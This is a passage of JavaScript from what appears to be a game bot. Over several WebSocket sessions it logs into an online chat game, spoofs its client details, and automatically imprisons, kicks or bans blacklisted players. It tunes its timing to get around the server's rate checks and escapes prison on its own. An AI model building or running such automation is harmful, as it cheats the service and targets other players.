                ws3.send("QUIT :ds\r\n");
                log3.innerHTML += "QUIT<br>";
                log3.scrollTop = log3.scrollHeight;

                if (sleep.checked) {
              return OffSleep3();
            }

                if (work) {
                  setTimeout(() => {
                    ws3on = false;
                    var click_event = new CustomEvent("click");
                    var btn_element = document.querySelector(
                      "#btn-connect"
                    );
                    btn_element.dispatchEvent(click_event);
                  }, parseInt(document.getElementById("reconnect").value));
                }
              }, timing);

            }
          }
        }
      }

      if (snippets[0] === "JOIN" && (document.getElementById("lowsecmode").checked != true)) {
        if (!userFound3) {
          var text = event.data.toLowerCase();
          var member = text.split(" ");
          var gangblacklist = document.getElementById("gangblacklist").value.toLowerCase().split("\n");
          var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack3").value) + parseInt(document.getElementById("waiting3").value)) / 2) : parseInt(document.getElementById("waiting3").value);
          var timingLabel = timershift.checked ? "Auto" : "Defense";
          for (let element of gangblacklist) {
            if (userFound3) break;
            if (member.includes(element.toLowerCase())) {
              var memberindex = member.indexOf(element.toLowerCase());
              var userid = member[memberindex + 2];
              useridtarget3 = userid;
              status3 = "defense";
              log3.innerHTML += timingLabel + " " + member[memberindex + 1] + " in " + (timing) + "ms<br>";
              log3.scrollTop = log3.scrollHeight;
              userFound3 = true;

              timeout3 = setTimeout(() => {

                ws3.send("ACTION 3 " + userid + "\r\n");
                ws3.send("QUIT :ds\r\n");
                log3.innerHTML += "QUIT<br>";
                log3.scrollTop = log3.scrollHeight;

                if (sleep.checked) {
              return OffSleep3();
            }

                if (work) {
                  setTimeout(() => {
                    ws3on = false;
                    var click_event = new CustomEvent("click");
                    var btn_element = document.querySelector(
                      "#btn-connect"
                    );
                    btn_element.dispatchEvent(click_event);
                  }, parseInt(document.getElementById("reconnect").value));
                }
              }, timing);

            }
          }
        }
      }

      //lowsec

      if (snippets[0] === "JOIN" && (document.getElementById("lowsecmode").checked === true)) {
        if (!userFound3) {
          var snip = event.data;
          var snipmid = snip.toLowerCase();
          var snipfinal = snipmid.split(" ");
          snipfinal.push("randomname");

          var whitelist = document.getElementById("blacklist").value.split("\n");
          var gangwhitelist = document.getElementById("gangblacklist").value.split("\n");
          var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack3").value) + parseInt(document.getElementById("waiting3").value)) / 2) : parseInt(document.getElementById("waiting3").value);
          var timingLabel = timershift.checked ? "Auto" : "Defense";
          var indexself = snipfinal.indexOf(useridg3);
          snipfinal[indexself] = "-";
          whitelist.forEach((element) => {
            if (snipfinal.includes(element.toLowerCase())) {
              var indexcheck = snipfinal.indexOf(element.toLowerCase());
              snipfinal[indexcheck + 1] = "-"
            }
          });
          gangwhitelist.forEach((element) => {
            if (snipfinal.includes(element.toLowerCase())) {
              var indexcheck = snipfinal.indexOf(element.toLowerCase());
              snipfinal[indexcheck + 2] = "-"
            }
          });

          if (snipfinal.includes("randomname")) {
            if (snipfinal[3].length >= 6) {
              var userid = snipfinal[3];
              useridtarget3 = userid;
              status3 = "defense";
              log3.innerHTML += timingLabel + " in " + (timing) + "ms<br>";
              log3.scrollTop = log3.scrollHeight;
              userFound3 = true;
              timeout3 = setTimeout(() => {
                ws3.send("ACTION 3 " + userid + "\r\n");
                
                // Only send QUIT if auto-release is disabled, or if sleep mode is enabled
                if (!autoescape.checked || sleep.checked) {
                  ws3.send("QUIT :ds\r\n");
                  log3.innerHTML += "QUIT<br>";
                  log3.scrollTop = log3.scrollHeight;
                } else {
                  log3.innerHTML += "Standing (auto-release enabled)<br>";
                  log3.scrollTop = log3.scrollHeight;
                }

                if (sleep.checked) {
              return OffSleep3();
            }
                if (work) {
                  setTimeout(() => {
                    ws3on = false;
                    var click_event = new CustomEvent("click");
                    var btn_element = document.querySelector(
                      "#btn-connect"
                    );
                    btn_element.dispatchEvent(click_event);
                  }, parseInt(document.getElementById("reconnect").value));
                }
              }, timing);
            }
          }
        }
      }

      if (snippets[0] === "PING\r\n") {
        ws3.send("PONG\r\n");
      }
	  if (snippets[0] === "471") {
		 setTimeout(() => {
        ws3.send("JOIN B\r\n");
		 }, 1000);
      }

      if (snippets[0] === "850" && snippets[1] != ":<div") {
        var text;
        for (var i = 40; i < snippets.length; i++) {
          text += snippets[i] + " ";
        }
        if (snippets[6] === "3s") {
          var logmsg = "3 second error."
          log3.innerHTML += logmsg.fontcolor("#ff0f0f") + "<br>";
          log3.scrollTop = log3.scrollHeight;
          // Increment timer on 3s error
          if (timershift.checked) {
            // When auto interval is enabled, adjust both attack AND defense
            incrementAttack3();
            incrementDefence3();
          }
        }
        else if (snippets[3] === "allows") {
          var logmsg = "Imprisoned successfully."
          log3.innerHTML += logmsg.fontcolor("#0fff7a") + "<br>";
          log3.scrollTop = log3.scrollHeight;
          // Decrement timer on success
          if (timershift.checked) {
            // When auto interval is enabled, adjust both attack AND defense
            decrementAttack3();
            decrementDefence3();
          }
        }
        else {
          log3.innerHTML += text + "<br>";
          log3.scrollTop = log3.scrollHeight;
        }
      }

      if (snippets[0] === "452" && snippets[3] === "sign") {
        log3.innerHTML += "You can enter galaxy only after 10s.<br>"
        log3.scrollTop = log3.scrollHeight;
        ws3on = false;
        var click_event = new CustomEvent("click");
        var btn_element = document.querySelector(
          "#btn-connect"
        );
        btn_element.dispatchEvent(click_event);
      }

      if (snippets[0] === "JOIN") {
        var text = event.data.toLowerCase();
        var member = text.split(" ");
        var blacklist = document
          .getElementById("blacklist")
          .value.split("\n");
        blacklist.forEach(element => {
          if (member.includes(element.toLowerCase())) {
            var memberindex = member.indexOf(element.toLowerCase());
            var useridnew = member[memberindex + 1];
            targetids3.push(useridnew);
            targetnames3.push(element);
          }
        });
      }

      if (snippets[0] === "JOIN") {
        var text = event.data.toLowerCase();
        var member = text.split(" ");
        var gangblacklist = document
          .getElementById("gangblacklist")
          .value.split("\n");
        gangblacklist.forEach(element => {
          if (member.includes(element.toLowerCase())) {
            var memberindex = member.indexOf(element.toLowerCase());
            var useridnew = member[memberindex + 2];
            targetids3.push(useridnew);

            targetnames3.push(member[memberindex + 1]);
          }
        });
      }


      if (snippets[0] === "PART" && targetids3.indexOf(snippets[1]) != -1) {
        var index = targetids3.indexOf(snippets[1]);

        targetids3.splice(index, 1);
        targetnames3.splice(index, 1);
        attackids3.splice(index, 1);
        attacknames3.splice(index, 1);
        if (smart.checked && snippets[1] === useridattack3 && targetids3.length != 0 && attackids3.length != 0) {
          var newArr = attackids3.slice();
          useridattack3 = newArr[Math.floor(Math.random() * newArr.length)];
          var ind = attackids3.indexOf(useridattack3);
          log3.innerHTML += "New Target: " + attacknames3[ind] + "<br>";
          log3.scrollTop = log3.scrollHeight;
        }
        if (targetids3.length === 0 && (smart.checked)) {
          clearTimeout(timeout3);
          userFound3 = false;
          log3.innerHTML += "Standing now..<br>"
          log3.scrollTop = log3.scrollHeight;
        }
      }

      if (snippets[0] === "SLEEP" && targetids3.indexOf(snippets[1].replace(/(\r\n|\n|\r)/gm, "")) != -1) {
        var index = targetids3.indexOf(snippets[1].replace(/(\r\n|\n|\r)/gm, ""));
        targetids3.splice(index, 1);
        targetnames3.splice(index, 1);
        attackids3.splice(index, 1);
        attacknames3.splice(index, 1);

        if (smart.checked && (snippets[1] === useridattack3 + "\r\n") && targetids3.length != 0 && attackids3.length != 0) {
          var newArr = attackids3.slice();
          useridattack3 = newArr[Math.floor(Math.random() * newArr.length)];
          var ind = attackids3.indexOf(useridattack3);
          log3.innerHTML += "New Target: " + attacknames3[ind] + "<br>";
          log3.scrollTop = log3.scrollHeight;
        }
        if (targetids3.length === 0 && (smart.checked)) {
          clearTimeout(timeout3);
          userFound3 = false;
          log3.innerHTML += "Standing now..<br>"
          log3.scrollTop = log3.scrollHeight;
        }
      }

      if (autoescape.checked) {
        if (snippets[0] === "900") {
          var plnt = snippets[1];
          if (plnt && plnt.slice(0, 6) === "Prison") {
            console.log('DEBUG ws3 autorelease: Prison detected, triggering escape');
            // Add a small delay before triggering escape to ensure proper state
            setTimeout(() => {
              var escape = document.getElementById("releasenow");
              escape.click();
              var planet = document.getElementById("planet").value;
              setTimeout(() => {
                if (ws3 && ws3.readyState === 1) {
                  ws3.send(`JOIN ${planet}\r\n`);
                  console.log('DEBUG ws3 autorelease: rejoined planet after escape');
                } else {
                  console.log('DEBUG ws3 autorelease: ws3 not connected, cannot rejoin');
                }
              }, 3000);
            }, 1000);
          }
        } else if (snippets[1] === "PRISON" && snippets[2] === "0") {
          console.log('DEBUG ws3 autorelease: PRISON 0 detected, triggering escape');
          // Add a small delay before triggering escape to ensure proper state
          setTimeout(() => {
            var escape = document.getElementById("releasenow");
            escape.click();
            var planet = document.getElementById("planet").value;
            setTimeout(() => {
              if (ws3 && ws3.readyState === 1) {
                ws3.send(`JOIN ${planet}\r\n`);
                console.log('DEBUG ws3 autorelease: rejoined planet after escape');
              } else {
                console.log('DEBUG ws3 autorelease: ws3 not connected, cannot rejoin');
              }
            }, 3000);
          }, 1000);
        }
      }

      if (snippets[0] === "900") {
        log3.innerHTML += `Current Planet: ${snippets[1]}<br>`
        log3.scrollTop = log3.scrollHeight;

      }

    }
  }

  if (ws4) {
    ws4.onmessage = (event) => {
      var text = event.data;
      var snippets = text.split(" ");

      if (snippets[0] === "HAAAPSI") {
        haaapsi4 = snippets[1];
        // Clear pending timeout to prevent ghost actions
        clearTimeout(timeout4);
        userFound4 = false;
        status4 = "";
        threesec4 = false;
        targetids4 = [];
        targetnames4 = [];
        attackids4 = [];
        attacknames4 = [];
        useridattack4 = "";
        useridtarget4 = "";
        lowtime = 0;
        ws4.send("RECOVER " + rcccc + "\r\n");
      }
      if (snippets[0] === "REGISTER") {
        var temp = parseHaaapsi(haaapsi4);
        id4 = snippets[1];
        var password = snippets[2];
        var username = snippets[3];
        useridg4 = id4;
        passwordg4 = password;
        finalusername4 = username.split("\r\n");
        ws4.send("USER " + id4 + " " + password + " " + finalusername4[0] + " " + temp + "\r\n");
      }
      if (snippets[0] === "999") {
        ws4.send("FWLISTVER 0\r\n");
        ws4.send("ADDONS 0 0\r\n");
        ws4.send("MYADDONS 0 0\r\n");
        ws4.send("PHONE 1366 768 0 2 :chrome 113.0.0.0\r\n");
        var planet = document.getElementById("planet").value;
        if (planet && planet !== "") {
          ws4.send("JOIN " + planet + "\r\n");
          log4.innerHTML = "Connection established. Joining " + planet + "<br>";
        } else {
          ws4.send("JOIN\r\n");
          log4.innerHTML = "Connection established.<br>";
        }
        log4.scrollTop = log4.scrollHeight;
        
        // Check prison status after connecting if auto-release is enabled
        if (autoescape.checked) {
          setTimeout(() => {
            var escape = document.getElementById("releasenow");
            if (escape) {
              escape.click();
            }
          }, 2000);
        }
      }

      if (snippets[0] === "353" && snippets[3].slice(0, 6) !== "Prison" && (document.getElementById("lowsecmode").checked != true)) {
        var data = (event.data.replaceAll("+", "")).toLowerCase();
        var blacklistfull = document.getElementById("blacklist").value.toLowerCase();
        var blacklist = document.getElementById("blacklist").value.toLowerCase().split("\n");
        var gangblacklistfull = document.getElementById("gangblacklist").value.toLowerCase();
        var gangblacklist = document.getElementById("gangblacklist").value.toLowerCase().split("\n");
        var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack4").value) + parseInt(document.getElementById("waiting4").value)) / 2) : (parseInt(document.getElementById("attack4").value));
        var timingLabel = timershift.checked ? "Auto" : "Attack";
        if (blacklistfull !== "") {
          blacklist.forEach((element) => {
            if (data.includes(element)) {

              var replace = element + " ";
              var replaced = data.replaceAll(replace, "*");
              var arr = replaced.split("*");
              arr.shift();
              if (arr[0] != undefined) {
                targetids4.push(arr[0].split(" ")[0]);
                attackids4.push(arr[0].split(" ")[0]);
                targetnames4.push(element);
                attacknames4.push(element);
              }
            }
          });
        }
        if (gangblacklistfull !== "") {
          gangblacklist.forEach((element) => {
            if (data.includes(element)) {

              var replace = element + " ";
              var replaced = data.replaceAll(replace, "*");
              var arr = replaced.split("*");
              arr.shift();
              for (var i = 0; i < arr.length; i++) {
                var value = arr[i];
                targetnames4.push(value.split(" ")[0]);
                attacknames4.push(value.split(" ")[0]);
                targetids4.push(value.split(" ")[1]);
                attackids4.push(value.split(" ")[1]);
              }
            }
          });
        }
        if (!userFound4 && targetids4.length != 0) {
          var rand = Math.floor(Math.random() * targetids4.length);
          var userid = targetids4[rand];
          userFound4 = true;
          useridattack4 = userid;
          useridtarget4 = userid;
          status4 = "attack";
          log4.innerHTML += timingLabel + " " + targetnames4[rand] + " in " + timing + "ms<br>";
          log4.scrollTop = log4.scrollHeight;



          timeout4 = setTimeout(() => {
            ws4.send("ACTION 3 " + useridattack4 + "\r\n");
            ws4.send("QUIT :ds\r\n");
            log4.innerHTML += "QUIT<br>";
            log4.scrollTop = log4.scrollHeight;

            if (sleep.checked) {
              return OffSleep4();
            }
            if (work) {
              setTimeout(() => {
                ws4on = false;
                var click_event = new CustomEvent("click");
                var btn_element = document.querySelector(
                  "#btn-connect"
                );
                btn_element.dispatchEvent(click_event);
              }, parseInt(document.getElementById("reconnect").value));
            }

          }, timing);
        }
      }

      //lowsec
      if (snippets[0] === "353" && snippets[3].slice(0, 6) !== "Prison" && (document.getElementById("lowsecmode").checked === true)) {
        var members = event.data.split("+").join("");
        var midmembers = members.split("@").join("");
        var midmid = midmembers.split(":").join("");
        var finmembers = midmid.toLowerCase();
        var membersarr = finmembers.split(" ");
        membersarr.push("randomname");

        var whitelist = document.getElementById("blacklist").value.split("\n");
        var gangwhitelist = document.getElementById("gangblacklist").value.split("\n");
        var indexself = membersarr.indexOf(useridg4);
        membersarr[indexself] = "-";

        whitelist.forEach((element) => {
          if (membersarr.includes(element.toLowerCase())) {
            var indexcheck = membersarr.indexOf(element.toLowerCase());
            membersarr[indexcheck + 1] = "-";
          }
        });

        gangwhitelist.forEach((element) => {
          var occurances = countOccurrences(membersarr, element.toLowerCase());
          for (var k = 0; k < occurances; k++) {
            var indexcheck = membersarr.indexOf(element.toLowerCase());
            membersarr[indexcheck] = "-";
            membersarr[indexcheck + 2] = "-";
          }
        });

        var integers = membersarr.filter(Number);
        var userids = integers.filter(function (element) {
          if (isNaN(membersarr[membersarr.indexOf(element) - 1])) {
            return element.length >= 6;
          }
        });


        var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack4").value) + parseInt(document.getElementById("waiting4").value)) / 2) : (parseInt(document.getElementById("attack4").value));
        var timingLabel = timershift.checked ? "Auto" : "Attack";
        if (!userFound4 && userids.length != 0) {
          var rand = Math.floor(Math.random() * userids.length);
          var userid = userids[rand];
          userFound4 = true;
          useridattack4 = userid;
          useridtarget4 = userid;
          status4 = "attack";
          log4.innerHTML += timingLabel + " " + membersarr[membersarr.indexOf(userid) - 1] + " in " + (timing) + "ms<br>";
          log4.scrollTop = log4.scrollHeight;


          timeout4 = setTimeout(() => {
            ws4.send("ACTION 3 " + useridattack4 + "\r\n");
            ws4.send("QUIT :ds\r\n");
            log4.innerHTML += "QUIT<br>";
            log4.scrollTop = log4.scrollHeight;

            if (sleep.checked) {
              return OffSleep4();
            }
            if (work) {
              setTimeout(() => {
                ws4on = false;
                var click_event = new CustomEvent("click");
                var btn_element = document.querySelector(
                  "#btn-connect"
                );
                btn_element.dispatchEvent(click_event);
              }, parseInt(document.getElementById("reconnect").value));
            }

          }, timing);
        }
      }

      if (snippets[0] === "JOIN" && (document.getElementById("lowsecmode").checked != true)) {
        if (!userFound4) {
          var text = event.data.toLowerCase();
          var member = text.split(" ");
          var blacklist = document.getElementById("blacklist").value.toLowerCase().split("\n");
          var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack4").value) + parseInt(document.getElementById("waiting4").value)) / 2) : parseInt(document.getElementById("waiting4").value);
          var timingLabel = timershift.checked ? "Auto" : "Defense";

          for (let element of blacklist) {
            if (userFound4) break;
            if (member.includes(element.toLowerCase())) {
              var memberindex = member.indexOf(element.toLowerCase());
              var userid = member[memberindex + 1];
              useridtarget4 = userid;
              status4 = "defense";
              log4.innerHTML += timingLabel + " " + element + " in " + (timing) + "ms<br>";
              log4.scrollTop = log4.scrollHeight;
              userFound4 = true;

              timeout4 = setTimeout(() => {

                ws4.send("ACTION 3 " + userid + "\r\n");
                ws4.send("QUIT :ds\r\n");
                log4.innerHTML += "QUIT<br>";
                log4.scrollTop = log4.scrollHeight;

                if (sleep.checked) {
              return OffSleep4();
            }

                if (work) {
                  setTimeout(() => {
                    ws4on = false;
                    var click_event = new CustomEvent("click");
                    var btn_element = document.querySelector(
                      "#btn-connect"
                    );
                    btn_element.dispatchEvent(click_event);
                  }, parseInt(document.getElementById("reconnect").value));
                }
              }, timing);

            }
          }
        }
      }

      if (snippets[0] === "JOIN" && (document.getElementById("lowsecmode").checked != true)) {
        if (!userFound4) {
          var text = event.data.toLowerCase();
          var member = text.split(" ");
          var gangblacklist = document.getElementById("gangblacklist").value.toLowerCase().split("\n");
          var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack4").value) + parseInt(document.getElementById("waiting4").value)) / 2) : parseInt(document.getElementById("waiting4").value);
          var timingLabel = timershift.checked ? "Auto" : "Defense";
          for (let element of gangblacklist) {
            if (userFound4) break;
            if (member.includes(element.toLowerCase())) {
              var memberindex = member.indexOf(element.toLowerCase());
              var userid = member[memberindex + 2];
              useridtarget4 = userid;
              status4 = "defense";
              log4.innerHTML += timingLabel + " " + member[memberindex + 1] + " in " + (timing) + "ms<br>";
              log4.scrollTop = log4.scrollHeight;
              userFound4 = true;

              timeout4 = setTimeout(() => {

                ws4.send("ACTION 3 " + userid + "\r\n");
                ws4.send("QUIT :ds\r\n");
                log4.innerHTML += "QUIT<br>";
                log4.scrollTop = log4.scrollHeight;

                if (sleep.checked) {
              return OffSleep4();
            }


                if (work) {
                  setTimeout(() => {
                    ws4on = false;
                    var click_event = new CustomEvent("click");
                    var btn_element = document.querySelector(
                      "#btn-connect"
                    );
                    btn_element.dispatchEvent(click_event);
                  }, parseInt(document.getElementById("reconnect").value));
                }
              }, timing);

            }
          }
        }
      }

      //lowsec

      if (snippets[0] === "JOIN" && (document.getElementById("lowsecmode").checked === true)) {
        if (!userFound4) {
          var snip = event.data;
          var snipmid = snip.toLowerCase();
          var snipfinal = snipmid.split(" ");
          snipfinal.push("randomname");

          var whitelist = document.getElementById("blacklist").value.split("\n");
          var gangwhitelist = document.getElementById("gangblacklist").value.split("\n");
          var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack4").value) + parseInt(document.getElementById("waiting4").value)) / 2) : parseInt(document.getElementById("waiting4").value);
          var timingLabel = timershift.checked ? "Auto" : "Defense";
          var indexself = snipfinal.indexOf(useridg4);
          snipfinal[indexself] = "-";
          whitelist.forEach((element) => {
            if (snipfinal.includes(element.toLowerCase())) {
              var indexcheck = snipfinal.indexOf(element.toLowerCase());
              snipfinal[indexcheck + 1] = "-"
            }
          });
          gangwhitelist.forEach((element) => {
            if (snipfinal.includes(element.toLowerCase())) {
              var indexcheck = snipfinal.indexOf(element.toLowerCase());
              snipfinal[indexcheck + 2] = "-"
            }
          });

          if (snipfinal.includes("randomname")) {
            if (snipfinal[3].length >= 6) {
              var userid = snipfinal[3];
              useridtarget4 = userid;
              status4 = "defense";
              log4.innerHTML += timingLabel + " in " + (timing) + "ms<br>";
              log4.scrollTop = log4.scrollHeight;
              userFound4 = true;
              timeout4 = setTimeout(() => {
                ws4.send("ACTION 3 " + userid + "\r\n");
                
                // Only send QUIT if auto-release is disabled, or if sleep mode is enabled
                if (!autoescape.checked || sleep.checked) {
                  ws4.send("QUIT :ds\r\n");
                  log4.innerHTML += "QUIT<br>";
                  log4.scrollTop = log4.scrollHeight;
                } else {
                  log4.innerHTML += "Standing (auto-release enabled)<br>";
                  log4.scrollTop = log4.scrollHeight;
                }

                if (sleep.checked) {
              return OffSleep4();
            }
                if (work) {
                  setTimeout(() => {
                    ws4on = false;
                    var click_event = new CustomEvent("click");
                    var btn_element = document.querySelector(
                      "#btn-connect"
                    );
                    btn_element.dispatchEvent(click_event);
                  }, parseInt(document.getElementById("reconnect").value));
                }
              }, timing);
            }
          }
        }
      }

      if (snippets[0] === "PING\r\n") {
        ws4.send("PONG\r\n");
      }
if (snippets[0] === "471") {
		 setTimeout(() => {
        ws4.send("JOIN B\r\n");
		 }, 1000);
      }
      if (snippets[0] === "850" && snippets[1] != ":<div") {
        var text;
        for (var i = 40; i < snippets.length; i++) {
          text += snippets[i] + " ";
        }
        if (snippets[6] === "3s") {
          var logmsg = "3 second error."
          log4.innerHTML += logmsg.fontcolor("#ff0f0f") + "<br>";
          log4.scrollTop = log4.scrollHeight;
          // Increment timer on 3s error
          if (timershift.checked) {
            // When auto interval is enabled, adjust both attack AND defense
            incrementAttack4();
            incrementDefence4();
          }
        }
        else if (snippets[3] === "allows") {
          var logmsg = "Imprisoned successfully."
          log4.innerHTML += logmsg.fontcolor("#0fff7a") + "<br>";
          log4.scrollTop = log4.scrollHeight;
          // Decrement timer on success
          if (timershift.checked) {
            // When auto interval is enabled, adjust both attack AND defense
            decrementAttack4();
            decrementDefence4();
          }
        }
        else {
          log4.innerHTML += text + "<br>";
          log4.scrollTop = log4.scrollHeight;
        }
      }

      if (snippets[0] === "452" && snippets[3] === "sign") {
        log4.innerHTML += "You can enter galaxy only after 10s.<br>"
        log4.scrollTop = log4.scrollHeight;
        ws4on = false;
        var click_event = new CustomEvent("click");
        var btn_element = document.querySelector(
          "#btn-connect"
        );
        btn_element.dispatchEvent(click_event);
      }

      if (snippets[0] === "JOIN") {
        var text = event.data.toLowerCase();
        var member = text.split(" ");
        var blacklist = document
          .getElementById("blacklist")
          .value.split("\n");
        blacklist.forEach(element => {
          if (member.includes(element.toLowerCase())) {
            var memberindex = member.indexOf(element.toLowerCase());
            var useridnew = member[memberindex + 1];
            targetids4.push(useridnew);
            targetnames4.push(element);
          }
        });
      }

      if (snippets[0] === "JOIN") {
        var text = event.data.toLowerCase();
        var member = text.split(" ");
        var gangblacklist = document
          .getElementById("gangblacklist")
          .value.split("\n");
        gangblacklist.forEach(element => {
          if (member.includes(element.toLowerCase())) {
            var memberindex = member.indexOf(element.toLowerCase());
            var useridnew = member[memberindex + 2];
            targetids4.push(useridnew);

            targetnames4.push(member[memberindex + 1]);
          }
        });
      }

      if (snippets[0] === "PART" && targetids4.indexOf(snippets[1]) != -1) {
        var index = targetids4.indexOf(snippets[1]);

        targetids4.splice(index, 1);
        targetnames4.splice(index, 1);
        attackids4.splice(index, 1);
        attacknames4.splice(index, 1);
        if (smart.checked && snippets[1] === useridattack4 && targetids4.length != 0 && attackids4.length != 0) {
          var newArr = attackids4.slice();
          useridattack4 = newArr[Math.floor(Math.random() * newArr.length)];
          var ind = attackids4.indexOf(useridattack4);
          log4.innerHTML += "New Target: " + attacknames4[ind] + "<br>";
          log4.scrollTop = log4.scrollHeight;
        }
        if (targetids4.length === 0 && (smart.checked)) {
          clearTimeout(timeout4);
          userFound4 = false;
          log4.innerHTML += "Standing now..<br>"
          log4.scrollTop = log4.scrollHeight;
        }
      }

      if (snippets[0] === "SLEEP" && targetids4.indexOf(snippets[1].replace(/(\r\n|\n|\r)/gm, "")) != -1) {
        var index = targetids4.indexOf(snippets[1].replace(/(\r\n|\n|\r)/gm, ""));
        targetids4.splice(index, 1);
        targetnames4.splice(index, 1);
        attackids4.splice(index, 1);
        attacknames4.splice(index, 1);

        if (smart.checked && (snippets[1] === useridattack4 + "\r\n") && targetids4.length != 0 && attackids4.length != 0) {
          var newArr = attackids4.slice();
          useridattack4 = newArr[Math.floor(Math.random() * newArr.length)];
          var ind = attackids4.indexOf(useridattack4);
          log4.innerHTML += "New Target: " + attacknames4[ind] + "<br>";
          log4.scrollTop = log4.scrollHeight;
        }
        if (targetids4.length === 0 && (smart.checked)) {
          clearTimeout(timeout4);
          userFound4 = false;
          log4.innerHTML += "Standing now..<br>"
          log4.scrollTop = log4.scrollHeight;
        }
      }

      if (autoescape.checked) {
        if (snippets[0] === "900") {
          var plnt = snippets[1];
          if (plnt && plnt.slice(0, 6) === "Prison") {
            console.log('DEBUG ws4 autorelease: Prison detected, triggering escape');
            // Add a small delay before triggering escape to ensure proper state
            setTimeout(() => {
              var escape = document.getElementById("releasenow");
              escape.click();
              var planet = document.getElementById("planet").value;
              setTimeout(() => {
                if (ws4 && ws4.readyState === 1) {
                  ws4.send(`JOIN ${planet}\r\n`);
                  console.log('DEBUG ws4 autorelease: rejoined planet after escape');
                } else {
                  console.log('DEBUG ws4 autorelease: ws4 not connected, cannot rejoin');
                }
              }, 3000);
            }, 1000);
          }
        } else if (snippets[1] === "PRISON" && snippets[2] === "0") {
          console.log('DEBUG ws4 autorelease: PRISON 0 detected, triggering escape');
          // Add a small delay before triggering escape to ensure proper state
          setTimeout(() => {
            var escape = document.getElementById("releasenow");
            escape.click();
            var planet = document.getElementById("planet").value;
            setTimeout(() => {
              if (ws4 && ws4.readyState === 1) {
                ws4.send(`JOIN ${planet}\r\n`);
                console.log('DEBUG ws4 autorelease: rejoined planet after escape');
              } else {
                console.log('DEBUG ws4 autorelease: ws4 not connected, cannot rejoin');
              }
            }, 3000);
          }, 1000);
        }
      }

      if (snippets[0] === "900") {
        log4.innerHTML += `Current Planet: ${snippets[1]}<br>`
        log4.scrollTop = log4.scrollHeight;

      }

    }
  }

  if (ws5) {
    ws5.onmessage = (event) => {
      var text = event.data;
      var snippets = text.split(" ");

      if (snippets[0] === "HAAAPSI") {
        haaapsi5 = snippets[1];
        ws5.send("RECOVER " + kickrc + "\r\n");
      }
      if (snippets[0] === "REGISTER") {
        var temp = parseHaaapsi(haaapsi5);
        id5 = snippets[1];
        var password = snippets[2];
        var username = snippets[3];
        useridg5 = id5;
        passwordg5 = password;
        finalusername5 = username.split("\r\n");
        ws5.send("USER " + id5 + " " + password + " " + finalusername5[0] + " " + temp + "\r\n");
      }
      if (snippets[0] === "999") {
        ws5.send("FWLISTVER 0\r\n");
        ws5.send("ADDONS 0 0\r\n");
        ws5.send("MYADDONS 0 0\r\n");
        ws5.send("PHONE 1366 768 0 2 :chrome 113.0.0.0\r\n");
        var planet = document.getElementById("planet").value;
        if (planet && planet !== "") {
          ws5.send("JOIN " + planet + "\r\n");
        } else {
          ws5.send("JOIN\r\n");
        }
        ws5.send("REMOVE -999\r\n");
      }
      if (snippets[0] === "PING\r\n") {
        ws5.send("PONG\r\n");
      }
if (snippets[0] === "471") {
		 setTimeout(() => {
        ws5.send("JOIN B\r\n");
		 }, 1000);
      }
      //everyone
      if ((snippets[0] === "JOIN") && (document.getElementById("kickall").checked)) {
        var snip = event.data;
        var snipmid = snip.toLowerCase();
        var snipfinal = snipmid.split(" ");
        snipfinal.push("randomname");
        var whitelist = document.getElementById("kblacklist").value.split("\n");
        var gangwhitelist = document.getElementById("kgangblacklist").value.split("\n");
        var indexself = snipfinal.indexOf(useridg5);
        snipfinal[indexself] = "-";
        whitelist.forEach((element) => {
          if (snipfinal.includes(element.toLowerCase())) {
            var indexcheck = snipfinal.indexOf(element.toLowerCase());
            snipfinal[indexcheck + 1] = "-"
          }
        });
        gangwhitelist.forEach((element) => {
          if (snipfinal.includes(element.toLowerCase())) {
            var indexcheck = snipfinal.indexOf(element.toLowerCase());
            snipfinal[indexcheck + 2] = "-"
          }
        });

        if (snipfinal.includes("randomname")) {
          if (snipfinal[3].length >= 6) {
            var userid = snipfinal[3];
            if (document.getElementById("modekick").checked) {
              ws5.send(`KICK ${userid}\r\n`);
            }
            else {
              ws5.send(`BAN ${userid}\r\n`);
            }
          }
        }
      }

      //userblacklist
      if ((snippets[0] === "JOIN") && (document.getElementById("kickbybl").checked)) {

        var text = event.data.toLowerCase();
        var member = text.split(" ");
        var blacklist = document.getElementById("kblacklist").value.toLowerCase().split("\n");

        blacklist.forEach((element) => {
          if (member.includes(element.toLowerCase())) {
            var memberindex = member.indexOf(element.toLowerCase());
            var userid = member[memberindex + 1];
            if (document.getElementById("modekick").checked) {
              ws5.send(`KICK ${userid}\r\n`);
            }
            else {
              ws5.send(`BAN ${userid}\r\n`);
            }
          }
        });

      }
      //gangbl
      if ((snippets[0] === "JOIN") && (document.getElementById("kickbybl").checked)) {

        var text = event.data.toLowerCase();
        var member = text.split(" ");
        var gangblacklist = document.getElementById("kgangblacklist").value.toLowerCase().split("\n");

        gangblacklist.forEach((element) => {
          if (member.includes(element.toLowerCase())) {
            var memberindex = member.indexOf(element.toLowerCase());
            var userid = member[memberindex + 2];
            if (document.getElementById("modekick").checked) {
              ws5.send(`KICK ${userid}\r\n`);
            }
            else {
              ws5.send(`BAN ${userid}\r\n`);
            }
          }
        });
      }

      if ((snippets[0] === "860") && (document.getElementById("dadplus").checked)) {
        var text = event.data.toLowerCase();
        if (text.includes("aura")) {
          var userid = snippets[1];
          if (document.getElementById("modekick").checked) {
            ws5.send(`KICK ${userid}\r\n`);
          }
          else {
            ws5.send(`BAN ${userid}\r\n`);
          }
        }
      }

      // Auto-release logic for ws5 (kickrc)
      if (autoescape.checked) {
        if (snippets[0] === "900") {
          var plnt = snippets[1];
          if (plnt && plnt.slice(0, 6) === "Prison") {
            console.log('DEBUG ws5 autorelease: Prison detected, triggering escape');
            // Add a small delay before triggering escape to ensure proper state
            setTimeout(() => {
              var escape = document.getElementById("releasenow");
              escape.click();
              var planet = document.getElementById("planet").value;
              setTimeout(() => {
                if (ws5 && ws5.readyState === 1) {
                  ws5.send(`JOIN ${planet}\r\n`);
                  console.log('DEBUG ws5 autorelease: rejoined planet after escape');
                } else {
                  console.log('DEBUG ws5 autorelease: ws5 not connected, cannot rejoin');
                }
              }, 3000);
            }, 1000);
          }
        } else if (snippets[1] === "PRISON" && snippets[2] === "0") {
          console.log('DEBUG ws5 autorelease: PRISON 0 detected, triggering escape');
          // Add a small delay before triggering escape to ensure proper state
          setTimeout(() => {
